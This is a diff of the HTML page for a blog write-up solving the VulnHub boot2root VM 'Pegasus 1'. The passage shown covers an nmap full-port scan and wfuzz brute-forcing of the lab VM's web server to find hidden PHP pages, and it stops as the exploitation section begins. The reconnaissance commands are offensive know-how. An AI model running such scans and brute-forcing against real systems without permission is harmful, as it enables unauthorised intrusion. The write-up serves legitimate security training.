@@ -1,303 +1,170 @@
-<!DOCTYPE html>
-<html lang="en-us">
+<!doctype html><html lang=en>
 <head>
-  <link rel="preload" href="https://leonjza.github.io/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
-  <link rel="preload" href="https://leonjza.github.io/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
-  <link rel="preload" href="https://leonjza.github.io/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
-  <link rel="preload" href="https://leonjza.github.io/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
-  <meta charset="utf-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <title> hoof to root solving pegasus 1 | #!/slash/note</title>
-  <link rel = 'canonical' href = 'https://leonjza.github.io/blog/2014/12/23/hoof-to-root-solving-pegasus-1/'>
-  <meta name="description" content="[&#39;Caffeine fueled&#39;, &#39;(╯°□°)╯︵ ┻━┻&#39;, &#39;Security guy&#39;, &#39;Metalhead&#39;, &#39;I saw your password&#39;, &#39;KOOBo&#43;KXleKAv&#43;KXlSnjgaM=&#39;]">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta name="robots" content="all,follow">
-  <meta name="googlebot" content="index,follow,snippet,archive">
-  <meta property="og:title" content="hoof to root solving pegasus 1" />
+<title>
+hoof to root solving pegasus 1 ::
+#!/bin/note
+— a checkbox uncheckers notepad
+</title>
+<meta charset=utf-8>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<meta name=description content="introduction Pegasus 1 is a boot2root hosted on VulnHub built by @TheKnapsy. He wrote a blogpost about it too containing a small introduction with Pegasus as his first boot2root (hoof2root? ;p).
+ Having recently played in the Offsec Playground a little after having completed my OSCP, I was relatively exhausted. Pegasus had its fair share of frustrations and had me digging around quite a bit. I did however learn a very valuable lesson&amp;hellip; again. You will see this in the my_first section.
+Like many other write ups I do, I will also recommend you try this one first before you read on. For me, Pegasus was definitely slightly more difficult than the usual VulnHub stuff you would see, but part of that may just as well be due to fatigue and that year end holiday mode ;p. However, that should not discourage you to give it a bash anyways!
+Lets begin.
+">
+<meta name=keywords content="blog,hack,ctf,leonjza,pentester,red team,attack">
+<meta name=robots content="noodp">
+<link rel=canonical href=https://leonjza.github.io/blog/2014/12/23/hoof-to-root-solving-pegasus-1/>
+<link rel=stylesheet href=https://leonjza.github.io/assets/style.css>
+<link rel=stylesheet href=https://leonjza.github.io/style.css>
+<link rel=apple-touch-icon-precomposed sizes=144x144 href=https://leonjza.github.io/img/apple-touch-icon-144-precomposed.png>
+<link rel="shortcut icon" href=https://leonjza.github.io/img/favicon.png>
+<link href=https://leonjza.github.io/assets/fonts/Inter-Italic.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=https://leonjza.github.io/assets/fonts/Inter-Regular.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=https://leonjza.github.io/assets/fonts/Inter-Medium.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=https://leonjza.github.io/assets/fonts/Inter-MediumItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=https://leonjza.github.io/assets/fonts/Inter-Bold.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=https://leonjza.github.io/assets/fonts/Inter-BoldItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<meta name=twitter:card content="summary">
+<meta name=twitter:title content="hoof to root solving pegasus 1">
+<meta name=twitter:description content="introduction
+Pegasus 1 is a boot2root hosted on VulnHub built by @TheKnapsy. He wrote a blogpost about it too containing a small introduction with Pegasus as his first boot2root (hoof2root? ;p).
+
+  
+    
+    
+  
+
+
+Having recently played in the Offsec Playground a little after having completed my OSCP, I was relatively exhausted. Pegasus had its fair share of frustrations and had me digging around quite a bit. I did however learn a very valuable lesson&mldr; again. You will see this in the my_first section.
+Like many other write ups I do, I will also recommend you try this one first before you read on. For me, Pegasus was definitely slightly more difficult than the usual VulnHub stuff you would see, but part of that may just as well be due to fatigue and that year end holiday mode ;p. However, that should not discourage you to give it a bash anyways!
+Lets begin.">
+<meta property="og:title" content="hoof to root solving pegasus 1">
 <meta property="og:description" content="introduction
 Pegasus 1 is a boot2root hosted on VulnHub built by @TheKnapsy. He wrote a blogpost about it too containing a small introduction with Pegasus as his first boot2root (hoof2root? ;p).
 
-
-
-Having recently played in the Offsec Playground a little after having completed my OSCP, I was relatively exhausted. Pegasus had its fair share of frustrations and had me digging around quite a bit. I did however learn a very valuable lesson&hellip; again. You will see this in the my_first section.
-Like many other write ups I do, I will also recommend you try this one first before you read on. For me, Pegasus was definitely slightly more difficult than the usual VulnHub stuff you would see, but part of that may just as well be due to fatigue and that year end holiday mode ;p. However, that should not discourage you to give it a bash anyways!
-Lets begin." />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://leonjza.github.io/blog/2014/12/23/hoof-to-root-solving-pegasus-1/" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2014-12-23T08:29:49+00:00" />
-<meta property="article:modified_time" content="2014-12-23T08:29:49+00:00" />
-
-
-  <meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="hoof to root solving pegasus 1"/>
-<meta name="twitter:description" content="introduction
-Pegasus 1 is a boot2root hosted on VulnHub built by @TheKnapsy. He wrote a blogpost about it too containing a small introduction with Pegasus as his first boot2root (hoof2root? ;p).
-
-
-
-Having recently played in the Offsec Playground a little after having completed my OSCP, I was relatively exhausted. Pegasus had its fair share of frustrations and had me digging around quite a bit. I did however learn a very valuable lesson&hellip; again. You will see this in the my_first section.
-Like many other write ups I do, I will also recommend you try this one first before you read on. For me, Pegasus was definitely slightly more difficult than the usual VulnHub stuff you would see, but part of that may just as well be due to fatigue and that year end holiday mode ;p. However, that should not discourage you to give it a bash anyways!
-Lets begin."/>
-
-  
   
     
-  
-  
-  <link rel="stylesheet" href="https://leonjza.github.io/css/styles.c05d68261bf086a9d7713c4f8a6215a3601608e267a816a7ee58f139b3d1aae51222aae2081c8e0c6bd35e1334773b7a16283022f31f92afd93bb37e5e822e66.css" integrity="sha512-wF1oJhvwhqnXcTxPimIVo2AWCOJnqBan7ljxObPRquUSIqriCByODGvTXhM0dzt6FigwIvMfkq/ZO7N&#43;XoIuZg=="> 
-
-  
-   <link rel="stylesheet" href="https://leonjza.github.io/css/cactus-custom.css"> 
-  
-    <!--[if lt IE 9]>
-      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
-      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
-    <![endif]-->
-  
-
-  
-<link rel="icon" type="image/png" href="https://leonjza.github.io/images/favicon.ico" />
-
-  
-  
-  
-  
-  
     
-<script type="application/javascript">
-var doNotTrack = false;
-if (!doNotTrack) {
-	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
-	ga('create', 'UA-44457032-2', 'auto');
-	
-	ga('send', 'pageview');
-}
-</script>
-<script async src='https://www.google-analytics.com/analytics.js'></script>
+  
 
-  
-  
+
+Having recently played in the Offsec Playground a little after having completed my OSCP, I was relatively exhausted. Pegasus had its fair share of frustrations and had me digging around quite a bit. I did however learn a very valuable lesson&mldr; again. You will see this in the my_first section.
+Like many other write ups I do, I will also recommend you try this one first before you read on. For me, Pegasus was definitely slightly more difficult than the usual VulnHub stuff you would see, but part of that may just as well be due to fatigue and that year end holiday mode ;p. However, that should not discourage you to give it a bash anyways!
+Lets begin.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://leonjza.github.io/blog/2014/12/23/hoof-to-root-solving-pegasus-1/"><meta property="article:section" content="posts">
+<meta property="article:published_time" content="2014-12-23T08:29:49+00:00">
+<meta property="article:modified_time" content="2014-12-23T08:29:49+00:00"><meta property="og:site_name" content="#!/bin/note
+">
 </head>
-
-<body class="max-width mx-auto px3 ltr">
-  <div class="content index py4">
-
-  <div id="header-post">
-  <a id="menu-icon" href="#" class="active"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
-  <span id="menu" style="visibility: visible;">
-    <span id="nav">
-      <ul>
-         
-        <li><a href="https://leonjza.github.io/">Home</a></li>
-         
-        <li><a href="https://leonjza.github.io/categories">Categories</a></li>
-         
-        <li><a href="https://leonjza.github.io/posts">Posts</a></li>
-         
-        <li><a href="https://leonjza.github.io/about/">About Me</a></li>
-        
-      </ul>
-    </span>
-    <br/>
-    <span id="actions">
-      <ul>
-        
-        <li>
-          <a class="icon" href=" https://leonjza.github.io/blog/2014/12/06/playing-in-the-playground-a-offsec-virtual-pentesting-labs-review/" aria-label="Previous">
-            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
-          </a>
-        </li>
-        
-        
-        <li>
-          <a class="icon" href="https://leonjza.github.io/blog/2015/02/09/no-more-jailbreak-detection-an-adventure-into-android-app-reversing-and-smali-patching/" aria-label="Next">
-            <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
-          </a>
-        </li>
-        
-        <li>
-          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
-            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
-          </a>
-        </li>
-        <li>
-          <a class="icon" href="#" aria-label="Share">
-            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
-          </a>
-        </li>
-      </ul>
-      <span id="i-prev" class="info" style="display:none;">Previous post</span>
-      <span id="i-next" class="info" style="display:none;">Next post</span>
-      <span id="i-top" class="info" style="display:none;">Back to top</span>
-      <span id="i-share" class="info" style="display:none;">Share post</span>
-    </span>
-    <br/>
-    <div id="share" style="display: none">
-      
-      <ul>
-  
-  
-    
-  
-  
-  <li>
-    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f12%2f23%2fhoof-to-root-solving-pegasus-1%2f" aria-label="Facebook">
-      <i class="fab fa-facebook " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f12%2f23%2fhoof-to-root-solving-pegasus-1%2f&text=hoof%20to%20root%20solving%20pegasus%201" aria-label="Twitter">
-      <i class="fab fa-twitter " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f12%2f23%2fhoof-to-root-solving-pegasus-1%2f&title=hoof%20to%20root%20solving%20pegasus%201" aria-label="Linkedin">
-      <i class="fab fa-linkedin " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f12%2f23%2fhoof-to-root-solving-pegasus-1%2f&is_video=false&description=hoof%20to%20root%20solving%20pegasus%201" aria-label="Pinterest">
-      <i class="fab fa-pinterest " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="mailto:?subject=hoof%20to%20root%20solving%20pegasus%201&body=Check out this article: https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f12%2f23%2fhoof-to-root-solving-pegasus-1%2f" aria-label="Email">
-      <i class="fas fa-envelope " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f12%2f23%2fhoof-to-root-solving-pegasus-1%2f&title=hoof%20to%20root%20solving%20pegasus%201" aria-label="Pocket">
-      <i class="fab fa-get-pocket " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f12%2f23%2fhoof-to-root-solving-pegasus-1%2f&title=hoof%20to%20root%20solving%20pegasus%201" aria-label="reddit">
-      <i class="fab fa-reddit " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f12%2f23%2fhoof-to-root-solving-pegasus-1%2f&name=hoof%20to%20root%20solving%20pegasus%201&description=%3ch2%20id%3d%22introduction%22%3eintroduction%3c%2fh2%3e%0a%3cp%3e%3ca%20href%3d%22https%3a%2f%2fwww.vulnhub.com%2fentry%2fpegasus-1%2c109%2f%22%3ePegasus%201%3c%2fa%3e%20is%20a%20boot2root%20hosted%20on%20%3ca%20href%3d%22https%3a%2f%2fwww.vulnhub.com%2f%22%3eVulnHub%3c%2fa%3e%20built%20by%20%3ca%20href%3d%22https%3a%2f%2ftwitter.com%2ftheknapsy%22%3e%40TheKnapsy%3c%2fa%3e.%20He%20wrote%20a%20%3ca%20href%3d%22http%3a%2f%2fknapsy.github.io%2fblog%2f2014%2f12%2f16%2fpegasus-has-arrived-my-first-boot2root-vm%2f%22%3eblogpost%3c%2fa%3e%20about%20it%20too%20containing%20a%20small%20introduction%20with%20Pegasus%20as%20his%20first%20boot2root%20%28hoof2root%3f%20%3bp%29.%3c%2fp%3e%0a%3cfigure%3e%3cimg%20src%3d%22%2fimages%2fpegasus_logo.png%22%2f%3e%0a%3c%2ffigure%3e%0a%0a%3cp%3eHaving%20recently%20played%20in%20the%20%3ca%20href%3d%22https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f12%2f06%2fplaying-in-the-playground-a-offsec-virtual-pentesting-labs-review%2f%22%3eOffsec%20Playground%3c%2fa%3e%20a%20little%20after%20having%20completed%20my%20OSCP%2c%20I%20was%20relatively%20exhausted.%20Pegasus%20had%20its%20fair%20share%20of%20frustrations%20and%20had%20me%20digging%20around%20quite%20a%20bit.%20I%20did%20however%20learn%20a%20very%20valuable%20lesson%26hellip%3b%20%3cem%3eagain%3c%2fem%3e.%20You%20will%20see%20this%20in%20the%20%3cstrong%3emy_first%3c%2fstrong%3e%20section.%3c%2fp%3e%0a%3cp%3eLike%20many%20other%20write%20ups%20I%20do%2c%20I%20will%20also%20recommend%20you%20try%20this%20one%20first%20before%20you%20read%20on.%20For%20me%2c%20Pegasus%20was%20definitely%20slightly%20more%20difficult%20than%20the%20usual%20VulnHub%20stuff%20you%20would%20see%2c%20but%20part%20of%20that%20may%20just%20as%20well%20be%20due%20to%20fatigue%20and%20that%20year%20end%20holiday%20mode%20%3bp.%20However%2c%20that%20should%20not%20discourage%20you%20to%20give%20it%20a%20bash%20anyways%21%3c%2fp%3e%0a%3cp%3eLets%20begin.%3c%2fp%3e" aria-label="Tumblr">
-      <i class="fab fa-tumblr " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f12%2f23%2fhoof-to-root-solving-pegasus-1%2f&t=hoof%20to%20root%20solving%20pegasus%201" aria-label="Hacker News">
-      <i class="fab fa-hacker-news " aria-hidden="true"></i>
-    </a>
-  </li>
+<body class=dark-theme>
+<div class=container>
+<header class=header>
+<span class=header__inner>
+<a href=/ class=logo style=text-decoration:none>
+<span class=logo__mark><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg>
+</span>
+<span class=logo__text>#!/bin/note
+</span>
+<span class=logo__cursor></span>
+</a>
+<span class=header__right>
+<nav class=menu>
+<ul class="menu__inner menu__inner--desktop">
+<li><a href=/about/>About Me</a></li>
+<li><a href=/categories>Categories</a></li>
+<li><a href=/posts>Posts</a></li>
 </ul>
-
-    </div>
-    <div id="toc">
-      <nav id="TableOfContents">
-  <ul>
-    <li><a href="#introduction">introduction</a></li>
-    <li><a href="#nmap-again">nmap, again</a></li>
-    <li><a href="#stomping-some-hoofs-with-pegasus">stomping some hoofs with pegasus</a></li>
-    <li><a href="#pwning-mike">pwning mike</a></li>
-    <li><a href="#my_first-your_first-we_all_first">my_first, your_first, we_all_first</a>
-      <ul>
-        <li><a href="#rebuilding-mainc">rebuilding main.c</a></li>
-        <li><a href="#the-calculator-with-a-hole">the calculator with a hole</a></li>
-        <li><a href="#punching-more-than-numbers">punching more than numbers</a>
-          <ul>
-            <li><a href="#compiling-the-format-string">compiling the format string</a></li>
-            <li><a href="#finishing-the-exploit">finishing the exploit</a></li>
-          </ul>
-        </li>
-      </ul>
-    </li>
-    <li><a href="#hoofing-rooting-pegasus">hoofing (rooting) Pegasus</a></li>
-    <li><a href="#flag-">flag :)</a></li>
-  </ul>
+<ul class="menu__inner menu__inner--mobile">
+<li><a href=/about/>About Me</a></li>
+<li><a href=/categories>Categories</a></li>
+<li><a href=/posts>Posts</a></li>
+</ul>
 </nav>
-    </div>
-  </span>
+<span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
+</span>
+<span class=theme-toggle><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg>
+</span>
+</span>
+</span>
+</header>
+<div class=content>
+<div class=post>
+<h1 class=post-title>hoof to root solving pegasus 1</h1>
+<div class=post-meta>
+<span class=post-date>
+2014-12-23
+</span>
+<span class=post-read-time>— 21 min read</span>
 </div>
-
-
-  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
-    <header>
-      <h1 class="posttitle" itemprop="name headline">
-        hoof to root solving pegasus 1
-      </h1>
-      <div class="meta">
-        
-        <div class="postdate">
-          
-          <time datetime="2014-12-23 08:29:49 &#43;0000 UTC" itemprop="datePublished">2014-12-23</time>
-          
-        </div>
-        
-        
-        
-        <div class="article-category">
-            <i class="fas fa-archive"></i>
-            
-            
-            <a class="category-link" href="https://leonjza.github.io/categories/ctf">CTF</a>
-            
-             ,  
-            <a class="category-link" href="https://leonjza.github.io/categories/vulnerable-vm">Vulnerable VM</a>
-            
-             ,  
-            <a class="category-link" href="https://leonjza.github.io/categories/solution">Solution</a>
-            
-             ,  
-            <a class="category-link" href="https://leonjza.github.io/categories/challenge">Challenge</a>
-            
-             ,  
-            <a class="category-link" href="https://leonjza.github.io/categories/vulnhub">VulnHub</a>
-            
-        </div>
-        
-        
-      </div>
-    </header>
-
-  
-    <div class="content" itemprop="articleBody">
-      <h2 id="introduction">introduction</h2>
-<p><a href="https://www.vulnhub.com/entry/pegasus-1,109/">Pegasus 1</a> is a boot2root hosted on <a href="https://www.vulnhub.com/">VulnHub</a> built by <a href="https://twitter.com/theknapsy">@TheKnapsy</a>. He wrote a <a href="http://knapsy.github.io/blog/2014/12/16/pegasus-has-arrived-my-first-boot2root-vm/">blogpost</a> about it too containing a small introduction with Pegasus as his first boot2root (hoof2root? ;p).</p>
-<figure><img src="https://leonjza.github.io/images/pegasus_logo.png"/>
+<div class=post-content>
+<h2>Table of Contents</h2>
+<aside class=table-of-contents><nav id=TableOfContents>
+<ul>
+<li>
+<ul>
+<li><a href=#introduction>introduction</a></li>
+<li><a href=#nmap-again>nmap, again</a></li>
+<li><a href=#stomping-some-hoofs-with-pegasus>stomping some hoofs with pegasus</a></li>
+<li><a href=#pwning-mike>pwning mike</a></li>
+<li><a href=#my_first-your_first-we_all_first>my_first, your_first, we_all_first</a>
+<ul>
+<li><a href=#rebuilding-mainc>rebuilding main.c</a></li>
+<li><a href=#the-calculator-with-a-hole>the calculator with a hole</a></li>
+<li><a href=#punching-more-than-numbers>punching more than numbers</a>
+<ul>
+<li><a href=#compiling-the-format-string>compiling the format string</a></li>
+<li><a href=#finishing-the-exploit>finishing the exploit</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href=#hoofing-rooting-pegasus>hoofing (rooting) Pegasus</a></li>
+<li><a href=#flag->flag :)</a></li>
+</ul>
+</li>
+</ul>
+</nav></aside>
+<h2 id=introduction>introduction</h2>
+<p><a href=https://www.vulnhub.com/entry/pegasus-1,109/>Pegasus 1</a> is a boot2root hosted on <a href=https://www.vulnhub.com/>VulnHub</a> built by <a href=https://twitter.com/theknapsy>@TheKnapsy</a>. He wrote a <a href=http://knapsy.github.io/blog/2014/12/16/pegasus-has-arrived-my-first-boot2root-vm/>blogpost</a> about it too containing a small introduction with Pegasus as his first boot2root (hoof2root? ;p).</p>
+<figure class=left>
+<img src=/images/pegasus_logo.png>
 </figure>
-
-<p>Having recently played in the <a href="https://leonjza.github.io/blog/2014/12/06/playing-in-the-playground-a-offsec-virtual-pentesting-labs-review/">Offsec Playground</a> a little after having completed my OSCP, I was relatively exhausted. Pegasus had its fair share of frustrations and had me digging around quite a bit. I did however learn a very valuable lesson&hellip; <em>again</em>. You will see this in the <strong>my_first</strong> section.</p>
+<p>Having recently played in the <a href=https://leonjza.github.io/blog/2014/12/06/playing-in-the-playground-a-offsec-virtual-pentesting-labs-review/>Offsec Playground</a> a little after having completed my OSCP, I was relatively exhausted. Pegasus had its fair share of frustrations and had me digging around quite a bit. I did however learn a very valuable lesson&mldr; <em>again</em>. You will see this in the <strong>my_first</strong> section.</p>
 <p>Like many other write ups I do, I will also recommend you try this one first before you read on. For me, Pegasus was definitely slightly more difficult than the usual VulnHub stuff you would see, but part of that may just as well be due to fatigue and that year end holiday mode ;p. However, that should not discourage you to give it a bash anyways!</p>
 <p>Lets begin.</p>
-<h2 id="nmap-again">nmap, again</h2>
-<p>Starting a VM like this, you should almost have a knee-jerk reaction to reach for nmap as your first tool to use. A VM, hosted on the network, means you will probably be attacking this one&hellip; via the network. So after figuring out what the IP address is (via arp, netdiscover etc.), I threw nmap at it:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# nmap --reason -sV 192.168.56.101 -p-
+<h2 id=nmap-again>nmap, again</h2>
+<p>Starting a VM like this, you should almost have a knee-jerk reaction to reach for nmap as your first tool to use. A VM, hosted on the network, means you will probably be attacking this one&mldr; via the network. So after figuring out what the IP address is (via arp, netdiscover etc.), I threw nmap at it:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# nmap --reason -sV 192.168.56.101 -p-
 
-Starting Nmap 6.47 ( http://nmap.org ) at 2014-12-23 09:16 SAST
-Nmap scan report <span style="color:#f00">for</span> 192.168.56.101
-Host is up, received arp-response (0.00022s latency).
-Not shown: <span style="color:#f60">65531</span> closed ports
-Reason: <span style="color:#f60">65531</span> resets
+Starting Nmap 6.47 <span style=color:#f92672>(</span> http://nmap.org <span style=color:#f92672>)</span> at 2014-12-23 09:16 SAST
+Nmap scan report <span style=color:#66d9ef>for</span> 192.168.56.101
+Host is up, received arp-response <span style=color:#f92672>(</span>0.00022s latency<span style=color:#f92672>)</span>.
+Not shown: <span style=color:#ae81ff>65531</span> closed ports
+Reason: <span style=color:#ae81ff>65531</span> resets
 PORT      STATE SERVICE REASON  VERSION
-22/tcp    open  ssh     syn-ack OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
-111/tcp   open  rpcbind syn-ack 2-4 (RPC <span style="color:#0f0">#100000)</span>
+22/tcp    open  ssh     syn-ack OpenSSH 5.9p1 Debian 5ubuntu1.4 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
+111/tcp   open  rpcbind syn-ack 2-4 <span style=color:#f92672>(</span>RPC <span style=color:#75715e>#100000)</span>
 8088/tcp  open  http    syn-ack nginx 1.1.19
-55625/tcp open  status  syn-ack <span style="color:#f60">1</span> (RPC <span style="color:#0f0">#100024)</span>
-MAC Address: 08:00:27:88:F8:40 (Cadmus Computer Systems)
+55625/tcp open  status  syn-ack <span style=color:#ae81ff>1</span> <span style=color:#f92672>(</span>RPC <span style=color:#75715e>#100024)</span>
+MAC Address: 08:00:27:88:F8:40 <span style=color:#f92672>(</span>Cadmus Computer Systems<span style=color:#f92672>)</span>
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
-Nmap <span style="color:#f00">done</span>: <span style="color:#f60">1</span> IP address (<span style="color:#f60">1</span> host up) scanned in 16.37 seconds
+Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 16.37 seconds
 </code></pre></div><p><code>tcp/22</code>, <code>tcp/111</code>, <code>tcp/8088</code> and <code>tcp/55625</code>. Thats quite a bit to work with already. I decided to dive right into the web server that appears to be running on <code>tcp/8088</code>.</p>
-<h2 id="stomping-some-hoofs-with-pegasus">stomping some hoofs with pegasus</h2>
+<h2 id=stomping-some-hoofs-with-pegasus>stomping some hoofs with pegasus</h2>
 <p>Browsing to http://192.168.56.101:8088/, we are presented with a picture of Pegasus:</p>
-<figure><img src="https://leonjza.github.io/images/pegasus_web.png"/>
+<figure class=left>
+<img src=/images/pegasus_web.png>
 </figure>
-
 <p>I manually tried to browse to things like <code>robots.txt</code> etc, but everything responded with the same image. This was until I decided to browse to <code>index.php</code>, in an attempt to check that the web server is configured to serve PHP content:</p>
-<figure><img src="https://leonjza.github.io/images/pegasus_nginx_index.png"/>
+<figure class=left>
+<img src=/images/pegasus_nginx_index.png>
 </figure>
-
 <p>So this doesn’t exactly tell us PHP is supported yet, but it does get us somewhere if we wanted to brute force the web server in search of content. Inspecting the headers of the HTTP responses thus far, we would see that everything would return HTTP 200, however, <code>.php</code> scripts would 404 correctly. With that in mind, it was time to reach for <code>wfuzz</code> to discover some more.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/medium.txt  --hc <span style="color:#f60">404</span> http://192.168.56.101:8088/FUZZ.php
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/medium.txt  --hc <span style=color:#ae81ff>404</span> http://192.168.56.101:8088/FUZZ.php
 
 ********************************************************
 * Wfuzz  2.0 - The Web Bruteforcer                     *
@@ -306,213 +173,213 @@ Nmap <span style="color:#f00">done</span>: <span style="color:#f60">1</span> IP 
 Target: http://192.168.56.101:8088/FUZZ.php
 Payload type: file,/usr/share/wordlists/wfuzz/general/medium.txt
 
-Total requests: <span style="color:#eedd82">1660</span>
-==================================================================
-ID  Response   Lines      Word         Chars          <span style="color:#eedd82">Request</span>
-==================================================================
+Total requests: 1660
+<span style=color:#f92672>==================================================================</span>
+ID  Response   Lines      Word         Chars          Request
+<span style=color:#f92672>==================================================================</span>
 
-01426:  <span style="color:#eedd82">C</span>=<span style="color:#f60">200</span>      <span style="color:#f60">0</span> L         <span style="color:#f60">4</span> W       <span style="color:#f60">19</span> Ch    <span style="color:#87ceeb">&#34; - submit&#34;</span>
+01426:  C<span style=color:#f92672>=</span><span style=color:#ae81ff>200</span>      <span style=color:#ae81ff>0</span> L         <span style=color:#ae81ff>4</span> W       <span style=color:#ae81ff>19</span> Ch    <span style=color:#e6db74>&#34; - submit&#34;</span>
 </code></pre></div><p>And we have a HTTP 200 response for <code>submit.php</code>. So, I browsed to http://192.168.56.101:8088/submit.php:</p>
-<figure><img src="https://leonjza.github.io/images/pegasus_submit.png"/>
+<figure class=left>
+<img src=/images/pegasus_submit.png>
 </figure>
-
 <p>Well that isn&rsquo;t exactly useful. I played a little with the <code>submit.php</code> by sending a POST with some <code>--data</code>, but nothing useful came of it. Almost everything came back with <code>No data to process</code>.</p>
 <p>Admittedly, this was my first hurdle. I was thinking if there is a <code>submit.php</code>, surely there is something that actually submits the appropriate data to it? So I pulled out some more wordlists and fed them to wfuzz to work on. I&rsquo;ll be honest, I did not like this part much. The wordlists were just too big and it almost felt like this is probably not the way to go about this. <code>wfuzz</code> was working with <code>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code>, when finally I get a HTTP 200 for <code>codereview.php</code>.</p>
-<figure><img src="https://leonjza.github.io/images/pegasus_code_review.png"/>
+<figure class=left>
+<img src=/images/pegasus_code_review.png>
 </figure>
-
-<h2 id="pwning-mike">pwning mike</h2>
+<h2 id=pwning-mike>pwning mike</h2>
 <p>So mike is apparently a trainee code reviewer. We have a form where we can submit code for him to check out. This is the form that submits the POST data <code>code</code> to the previously found <code>submit.php</code>.</p>
